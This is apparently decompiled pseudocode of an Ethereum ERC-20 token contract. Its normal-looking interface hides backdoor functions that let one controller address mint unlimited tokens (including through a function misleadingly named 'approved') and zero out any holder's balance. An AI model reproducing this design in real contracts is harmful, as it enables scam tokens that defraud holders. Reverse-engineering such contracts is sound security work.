contract main {




// =====================  Runtime code  =====================


array of struct stor0;
array of struct stor1;
uint8 sub_f10c7e05;
uint8 decimals; offset 8
uint256 totalSupply;
address sub_c6bdc99cAddress;
address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[arg1]
}

function Owner() {
    return owner
}

function sub_c6bdc99c(?) {
    return sub_c6bdc99cAddress
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[arg1][arg2]
}

function sub_f10c7e05(?) {
    return sub_f10c7e05
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    allowance[msg.sender][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_b0101022(?) {
    if sub_c6bdc99cAddress != msg.sender:
        revert with 0, 'UnAuthorized'
    if totalSupply > 0x2af31dc4611873bf3f70834acdae9f0f4f534f5d60585a5f1c1a3ced1b:
        revert with 0, 17
    balanceOf[msg.sender] = 100 * 10^6 * totalSupply
    return 1
}

function sub_0d0b2400(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if sub_c6bdc99cAddress != msg.sender:
        revert with 0, 'UnAuthorized'
    if balanceOf[address(arg1)] < balanceOf[address(arg1)]:
        revert with 0, 17
    balanceOf[address(arg1)] = 0
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if balanceOf[msg.sender] < arg2:
        revert with 0, 17
    balanceOf[msg.sender] -= arg2
    if arg2 / 100 and sub_f10c7e05 > -1 / arg2 / 100:
        revert with 0, 17
    if arg2 < arg2 / 100 * sub_f10c7e05:
        revert with 0, 17
    if balanceOf[address(arg1)] > !(arg2 - (arg2 / 100 * sub_f10c7e05)):
        revert with 0, 17
    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 / 100 * sub_f10c7e05)
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(arg1)][msg.sender] < arg3:
        revert with 0, 17
    allowance[address(arg1)][msg.sender] -= arg3
    if balanceOf[address(arg1)] < arg3:
        revert with 0, 17
    balanceOf[address(arg1)] -= arg3
    if arg3 / 100 and sub_f10c7e05 > -1 / arg3 / 100:
        revert with 0, 17
    if arg3 < arg3 / 100 * sub_f10c7e05:
        revert with 0, 17
    if balanceOf[address(arg2)] > !(arg3 - (arg3 / 100 * sub_f10c7e05)):
        revert with 0, 17
    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * sub_f10c7e05)
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function approved(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if sub_c6bdc99cAddress != msg.sender:
        revert with 0, 'UnAuthorized'
    if not decimals:
        if arg2 and 1 > -1 / arg2:
            revert with 0, 17
        if balanceOf[address(arg1)] > !arg2:
            revert with 0, 17
        balanceOf[address(arg1)] += arg2
    else:
        if bool(bool(decimals < 78)) or bool(bool(decimals < 32)):
            if arg2 and 10^decimals > -1 / arg2:
                revert with 0, 17
            if balanceOf[address(arg1)] > !(arg2 * 10^decimals):
                revert with 0, 17
            balanceOf[address(arg1)] += arg2 * 10^decimals
        else:
            s = 10
            t = 1
            idx = decimals
            while idx > 1:
                if s > -1 / s:
                    revert with 0, 17
                if not bool(idx):
                    s = s * s
                    t = t
                    idx = uint255(idx) * 0.5
                    continue 
                s = s * s
                t = s * t
                idx = uint255(idx) * 0.5
                continue 
            if t > -1 / s:
                revert with 0, 17
            if arg2 and s * t > -1 / arg2:
                revert with 0, 17
            if balanceOf[address(arg1)] > !(arg2 * s * t):
                revert with 0, 17
            balanceOf[address(arg1)] += arg2 * s * t
    return 1
}

function name() {
    if bool(stor0.length):
        if bool(stor0.length) == uint255(stor0.length) * 0.5 < 32:
            revert with 0, 34
        if bool(stor0.length):
            if bool(stor0.length) == uint255(stor0.length) * 0.5 < 32:
                revert with 0, 34
            if Mask(256, -1, stor0.length):
                if 31 < uint255(stor0.length) * 0.5:
                    mem[128] = uint256(stor0.field_0)
                    idx = 128
                    s = 0
                    while (uint255(stor0.length) * 0.5) + 96 > idx:
                        mem[idx + 32] = stor0[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor0.length), data=mem[128 len ceil32(uint255(stor0.length) * 0.5)])
                mem[128] = 256 * stor0.length.field_8
        else:
            if bool(stor0.length) == stor0.length.field_1 < 32:
                revert with 0, 34
            if stor0.length.field_1:
                if 31 < stor0.length.field_1:
                    mem[128] = uint256(stor0.field_0)
                    idx = 128
                    s = 0
                    while stor0.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor0[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor0.length), data=mem[128 len ceil32(uint255(stor0.length) * 0.5)])
                mem[128] = 256 * stor0.length.field_8
        mem[ceil32(uint255(stor0.length) * 0.5) + 192 len ceil32(uint255(stor0.length) * 0.5)] = mem[128 len ceil32(uint255(stor0.length) * 0.5)]
        if ceil32(uint255(stor0.length) * 0.5) > uint255(stor0.length) * 0.5:
            mem[ceil32(uint255(stor0.length) * 0.5) + (uint255(stor0.length) * 0.5) + 192] = 0
        return Array(len=2 * Mask(256, -1, stor0.length), data=mem[128 len ceil32(uint255(stor0.length) * 0.5)], mem[(2 * ceil32(uint255(stor0.length) * 0.5)) + 192 len 2 * ceil32(uint255(stor0.length) * 0.5)]), 
    if bool(stor0.length) == stor0.length.field_1 < 32:
        revert with 0, 34
    if bool(stor0.length):
        if bool(stor0.length) == uint255(stor0.length) * 0.5 < 32:
            revert with 0, 34
        if Mask(256, -1, stor0.length):
            if 31 < uint255(stor0.length) * 0.5:
                mem[128] = uint256(stor0.field_0)
                idx = 128
                s = 0
                while (uint255(stor0.length) * 0.5) + 96 > idx:
                    mem[idx + 32] = stor0[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor0.length % 128, data=mem[128 len ceil32(stor0.length.field_1)])
            mem[128] = 256 * stor0.length.field_8
    else:
        if bool(stor0.length) == stor0.length.field_1 < 32:
            revert with 0, 34
        if stor0.length.field_1:
            if 31 < stor0.length.field_1:
                mem[128] = uint256(stor0.field_0)
                idx = 128
                s = 0
                while stor0.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor0[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor0.length % 128, data=mem[128 len ceil32(stor0.length.field_1)])
            mem[128] = 256 * stor0.length.field_8
    mem[ceil32(stor0.length.field_1) + 192 len ceil32(stor0.length.field_1)] = mem[128 len ceil32(stor0.length.field_1)]
    if ceil32(stor0.length.field_1) > stor0.length.field_1:
        mem[ceil32(stor0.length.field_1) + stor0.length.field_1 + 192] = 0
    return Array(len=stor0.length % 128, data=mem[128 len ceil32(stor0.length.field_1)], mem[(2 * ceil32(stor0.length.field_1)) + 192 len 2 * ceil32(stor0.length.field_1)]), 
}

function symbol() {
    if bool(stor1.length):
        if bool(stor1.length) == uint255(stor1.length) * 0.5 < 32:
            revert with 0, 34
        if bool(stor1.length):
            if bool(stor1.length) == uint255(stor1.length) * 0.5 < 32:
                revert with 0, 34
            if Mask(256, -1, stor1.length):
                if 31 < uint255(stor1.length) * 0.5:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while (uint255(stor1.length) * 0.5) + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length), data=mem[128 len ceil32(uint255(stor1.length) * 0.5)])
                mem[128] = 256 * stor1.length.field_8
        else:
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 0, 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length), data=mem[128 len ceil32(uint255(stor1.length) * 0.5)])
                mem[128] = 256 * stor1.length.field_8
        mem[ceil32(uint255(stor1.length) * 0.5) + 192 len ceil32(uint255(stor1.length) * 0.5)] = mem[128 len ceil32(uint255(stor1.length) * 0.5)]
        if ceil32(uint255(stor1.length) * 0.5) > uint255(stor1.length) * 0.5:
            mem[ceil32(uint255(stor1.length) * 0.5) + (uint255(stor1.length) * 0.5) + 192] = 0
        return Array(len=2 * Mask(256, -1, stor1.length), data=mem[128 len ceil32(uint255(stor1.length) * 0.5)], mem[(2 * ceil32(uint255(stor1.length) * 0.5)) + 192 len 2 * ceil32(uint255(stor1.length) * 0.5)]), 
    if bool(stor1.length) == stor1.length.field_1 < 32:
        revert with 0, 34
    if bool(stor1.length):
        if bool(stor1.length) == uint255(stor1.length) * 0.5 < 32:
            revert with 0, 34
        if Mask(256, -1, stor1.length):
            if 31 < uint255(stor1.length) * 0.5:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while (uint255(stor1.length) * 0.5) + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    else:
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 0, 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
    if ceil32(stor1.length.field_1) > stor1.length.field_1:
        mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
    return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
}

function _fallback() payable {
    if calldata.size < 4:
        require not calldata.size
    if unknown_0x95d89b41(?????) <= uint32(call.func_hash) >> 224:
        if unknown_0xc1448284(?????) > uint32(call.func_hash) >> 224:
            if unknown_0x95d89b41(?????) == uint32(call.func_hash) >> 224:
                require not msg.value
                if bool(stor1.length):
                    if bool(stor1.length) == uint255(stor1.length) * 0.5 < 32:
                        revert with 0, 34
                    if bool(stor1.length):
                        if bool(stor1.length) == uint255(stor1.length) * 0.5 < 32:
                            revert with 0, 34
                        if Mask(256, -1, stor1.length):
                            if 31 < uint255(stor1.length) * 0.5:
                                mem[160] = uint256(stor1.field_0)
                                idx = 160
                                s = 0
                                while (uint255(stor1.length) * 0.5) + 128 > idx:
                                    mem[idx + 32] = stor1[s].field_256
                                    idx = idx + 32
                                    s = s + 1
                                    continue 
                                return Array(len=2 * Mask(256, -1, stor1.length), data=mem[160 len ceil32(uint255(stor1.length) * 0.5)])
                            mem[160] = 256 * stor1.length.field_8
                    else:
                        if bool(stor1.length) == stor1.length.field_1 < 32:
                            revert with 0, 34
                        if stor1.length.field_1:
                            if 31 < stor1.length.field_1:
                                mem[160] = uint256(stor1.field_0)
                                idx = 160
                                s = 0
                                while stor1.length.field_1 + 128 > idx:
                                    mem[idx + 32] = stor1[s].field_256
                                    idx = idx + 32
                                    s = s + 1
                                    continue 
                                return Array(len=2 * Mask(256, -1, stor1.length), data=mem[160 len ceil32(uint255(stor1.length) * 0.5)])
                            mem[160] = 256 * stor1.length.field_8
                    mem[ceil32(uint255(stor1.length) * 0.5) + 224 len ceil32(uint255(stor1.length) * 0.5)] = mem[160 len ceil32(uint255(stor1.length) * 0.5)]
                    if ceil32(uint255(stor1.length) * 0.5) > uint255(stor1.length) * 0.5:
                        mem[ceil32(uint255(stor1.length) * 0.5) + (uint255(stor1.length) * 0.5) + 224] = 0
                    return Array(len=2 * Mask(256, -1, stor1.length), data=mem[160 len ceil32(uint255(stor1.length) * 0.5)], mem[(2 * ceil32(uint255(stor1.length) * 0.5)) + 224 len 2 * ceil32(uint255(stor1.length) * 0.5)]), 
                if bool(stor1.length) == stor1.length.field_1 < 32:
                    revert with 0, 34
                if bool(stor1.length):
                    if bool(stor1.length) == uint255(stor1.length) * 0.5 < 32:
                        revert with 0, 34
                    if Mask(256, -1, stor1.length):
                        if 31 < uint255(stor1.length) * 0.5:
                            mem[160] = uint256(stor1.field_0)
                            idx = 160
                            s = 0
                            while (uint255(stor1.length) * 0.5) + 128 > idx:
                                mem[idx + 32] = stor1[s].field_256
                                idx = idx + 32
                                s = s + 1
                                continue 
                            return Array(len=stor1.length % 128, data=mem[160 len ceil32(stor1.length.field_1)])
                        mem[160] = 256 * stor1.length.field_8
                else:
                    if bool(stor1.length) == stor1.length.field_1 < 32:
                        revert with 0, 34
                    if stor1.length.field_1:
                        if 31 < stor1.length.field_1:
                            mem[160] = uint256(stor1.field_0)
                            idx = 160
                            s = 0
                            while stor1.length.field_1 + 128 > idx:
                                mem[idx + 32] = stor1[s].field_256
                                idx = idx + 32
                                s = s + 1
                                continue 
                            return Array(len=stor1.length % 128, data=mem[160 len ceil32(stor1.length.field_1)])
                        mem[160] = 256 * stor1.length.field_8
                mem[ceil32(stor1.length.field_1) + 224 len ceil32(stor1.length.field_1)] = mem[160 len ceil32(stor1.length.field_1)]
                if ceil32(stor1.length.field_1) > stor1.length.field_1:
                    mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 224] = 0
                return Array(len=stor1.length % 128, data=mem[160 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 224 len 2 * ceil32(stor1.length.field_1)]), 
            if uint32(call.func_hash) >> 224 != unknown_0xa9059cbb(?????):
                if uint32(call.func_hash) >> 224 != unknown_0xb0101022(?????):
                    require unknown_0xb4a99a4e(?????) == uint32(call.func_hash) >> 224
                    require not msg.value
                    return owner
                require not msg.value
                if sub_c6bdc99cAddress != msg.sender:
                    revert with 0, 'UnAuthorized'
                if totalSupply > 0x2af31dc4611873bf3f70834acdae9f0f4f534f5d60585a5f1c1a3ced1b:
                    revert with 0, 17
                balanceOf[msg.sender] = 100 * 10^6 * totalSupply
            else:
                require not msg.value
                require calldata.size - 4 >= 64
                require arg1 == address(arg1)
                if balanceOf[msg.sender] < arg2:
                    revert with 0, 17
                balanceOf[msg.sender] -= arg2
                if arg2 / 100 and sub_f10c7e05 > -1 / arg2 / 100:
                    revert with 0, 17
                if arg2 < arg2 / 100 * sub_f10c7e05:
                    revert with 0, 17
                if balanceOf[address(arg1)] > !(arg2 - (arg2 / 100 * sub_f10c7e05)):
                    revert with 0, 17
                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 / 100 * sub_f10c7e05)
                emit Transfer(arg2, msg.sender, address(arg1));
        else:
            if uint32(call.func_hash) >> 224 != unknown_0xc1448284(?????):
                if unknown_0xc6bdc99c(?????) == uint32(call.func_hash) >> 224:
                    require not msg.value
                    return sub_c6bdc99cAddress
                if uint32(call.func_hash) >> 224 != unknown_0xdd62ed3e(?????):
                    require unknown_0xf10c7e05(?????) == uint32(call.func_hash) >> 224
                    require not msg.value
                    return sub_f10c7e05
                require not msg.value
                require calldata.size - 4 >= 64
                require arg1 == address(arg1)
                require arg2 == address(arg2)
                return allowance[arg1][arg2]
            require not msg.value
            require calldata.size - 4 >= 64
            require arg1 == address(arg1)
            if sub_c6bdc99cAddress != msg.sender:
                revert with 0, 'UnAuthorized'
            if not decimals:
                if arg2 and 1 > -1 / arg2:
                    revert with 0, 17
                if balanceOf[address(arg1)] > !arg2:
                    revert with 0, 17
                balanceOf[address(arg1)] += arg2
            else:
                if bool(bool(decimals < 78)) or bool(bool(decimals < 32)):
                    if arg2 and 10^decimals > -1 / arg2:
                        revert with 0, 17
                    if balanceOf[address(arg1)] > !(arg2 * 10^decimals):
                        revert with 0, 17
                    balanceOf[address(arg1)] += arg2 * 10^decimals
                else:
                    s = 10
                    t = 1
                    idx = decimals
                    while idx > 1:
                        if s > -1 / s:
                            revert with 0, 17
                        if not bool(idx):
                            s = s * s
                            t = t
                            idx = uint255(idx) * 0.5
                            continue 
                        s = s * s
                        t = s * t
                        idx = uint255(idx) * 0.5
                        continue 
                    if t > -1 / s:
                        revert with 0, 17
                    if arg2 and s * t > -1 / arg2:
                        revert with 0, 17
                    if balanceOf[address(arg1)] > !(arg2 * s * t):
                        revert with 0, 17
                    balanceOf[address(arg1)] += arg2 * s * t
    else:
        if unknown_0x18160ddd(?????) > uint32(call.func_hash) >> 224:
            if uint32(call.func_hash) >> 224 != name():
                if approve(address arg1, uint256 arg2) == uint32(call.func_hash) >> 224:
                    require not msg.value
                    require calldata.size - 4 >= 64
                    require arg1 == address(arg1)
                    allowance[msg.sender][address(arg1)] = arg2
                    emit Approval(arg2, msg.sender, address(arg1));
                else:
                    require unknown_0x0d0b2400(?????) == uint32(call.func_hash) >> 224
                    require not msg.value
                    require calldata.size - 4 >= 32
                    require arg1 == address(arg1)
                    if sub_c6bdc99cAddress != msg.sender:
                        revert with 0, 'UnAuthorized'
                    if balanceOf[address(arg1)] < balanceOf[address(arg1)]:
                        revert with 0, 17
                    balanceOf[address(arg1)] = 0
                return 1
            require not msg.value
            if bool(stor0.length):
                if bool(stor0.length) == uint255(stor0.length) * 0.5 < 32:
                    revert with 0, 34
                if bool(stor0.length):
                    if bool(stor0.length) == uint255(stor0.length) * 0.5 < 32:
                        revert with 0, 34
                    if Mask(256, -1, stor0.length):
                        if 31 < uint255(stor0.length) * 0.5:
                            mem[160] = uint256(stor0.field_0)
                            idx = 160
                            s = 0
                            while (uint255(stor0.length) * 0.5) + 128 > idx:
                                mem[idx + 32] = stor0[s].field_256
                                idx = idx + 32
                                s = s + 1
                                continue 
                            return Array(len=2 * Mask(256, -1, stor0.length), data=mem[160 len ceil32(uint255(stor0.length) * 0.5)])
                        mem[160] = 256 * stor0.length.field_8
                else:
                    if bool(stor0.length) == stor0.length.field_1 < 32:
                        revert with 0, 34
                    if stor0.length.field_1:
                        if 31 < stor0.length.field_1:
                            mem[160] = uint256(stor0.field_0)
                            idx = 160
                            s = 0
                            while stor0.length.field_1 + 128 > idx:
                                mem[idx + 32] = stor0[s].field_256
                                idx = idx + 32
                                s = s + 1
                                continue 
                            return Array(len=2 * Mask(256, -1, stor0.length), data=mem[160 len ceil32(uint255(stor0.length) * 0.5)])
                        mem[160] = 256 * stor0.length.field_8
                mem[ceil32(uint255(stor0.length) * 0.5) + 224 len ceil32(uint255(stor0.length) * 0.5)] = mem[160 len ceil32(uint255(stor0.length) * 0.5)]
                if ceil32(uint255(stor0.length) * 0.5) > uint255(stor0.length) * 0.5:
                    mem[ceil32(uint255(stor0.length) * 0.5) + (uint255(stor0.length) * 0.5) + 224] = 0
                return Array(len=2 * Mask(256, -1, stor0.length), data=mem[160 len ceil32(uint255(stor0.length) * 0.5)], mem[(2 * ceil32(uint255(stor0.length) * 0.5)) + 224 len 2 * ceil32(uint255(stor0.length) * 0.5)]), 
            if bool(stor0.length) == stor0.length.field_1 < 32:
                revert with 0, 34
            if bool(stor0.length):
                if bool(stor0.length) == uint255(stor0.length) * 0.5 < 32:
                    revert with 0, 34
                if Mask(256, -1, stor0.length):
                    if 31 < uint255(stor0.length) * 0.5:
                        mem[160] = uint256(stor0.field_0)
                        idx = 160
                        s = 0
                        while (uint255(stor0.length) * 0.5) + 128 > idx:
                            mem[idx + 32] = stor0[s].field_256
                            idx = idx + 32
                            s = s + 1
                            continue 
                        return Array(len=stor0.length % 128, data=mem[160 len ceil32(stor0.length.field_1)])
                    mem[160] = 256 * stor0.length.field_8
            else:
                if bool(stor0.length) == stor0.length.field_1 < 32:
                    revert with 0, 34
                if stor0.length.field_1:
                    if 31 < stor0.length.field_1:
                        mem[160] = uint256(stor0.field_0)
                        idx = 160
                        s = 0
                        while stor0.length.field_1 + 128 > idx:
                            mem[idx + 32] = stor0[s].field_256
                            idx = idx + 32
                            s = s + 1
                            continue 
                        return Array(len=stor0.length % 128, data=mem[160 len ceil32(stor0.length.field_1)])
                    mem[160] = 256 * stor0.length.field_8
            mem[ceil32(stor0.length.field_1) + 224 len ceil32(stor0.length.field_1)] = mem[160 len ceil32(stor0.length.field_1)]
            if ceil32(stor0.length.field_1) > stor0.length.field_1:
                mem[ceil32(stor0.length.field_1) + stor0.length.field_1 + 224] = 0
            return Array(len=stor0.length % 128, data=mem[160 len ceil32(stor0.length.field_1)], mem[(2 * ceil32(stor0.length.field_1)) + 224 len 2 * ceil32(stor0.length.field_1)]), 
        if unknown_0x18160ddd(?????) == uint32(call.func_hash) >> 224:
            require not msg.value
            return totalSupply
        if uint32(call.func_hash) >> 224 != unknown_0x23b872dd(?????):
            if unknown_0x313ce567(?????) == uint32(call.func_hash) >> 224:
                require not msg.value
                return decimals
            require unknown_0x70a08231(?????) == uint32(call.func_hash) >> 224
            require not msg.value
            require calldata.size - 4 >= 32
            require arg1 == address(arg1)
            return balanceOf[arg1]
        require not msg.value
        require calldata.size - 4 >= 96
        require arg1 == address(arg1)
        require arg2 == address(arg2)
        if allowance[address(arg1)][msg.sender] < arg3:
            revert with 0, 17
        allowance[address(arg1)][msg.sender] -= arg3
        if balanceOf[address(arg1)] < arg3:
            revert with 0, 17
        balanceOf[address(arg1)] -= arg3
        if arg3 / 100 and sub_f10c7e05 > -1 / arg3 / 100:
            revert with 0, 17
        if arg3 < arg3 / 100 * sub_f10c7e05:
            revert with 0, 17
        if balanceOf[address(arg2)] > !(arg3 - (arg3 / 100 * sub_f10c7e05)):
            revert with 0, 17
        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * sub_f10c7e05)
        emit Transfer(arg3, address(arg1), address(arg2));
    return 1
}



}
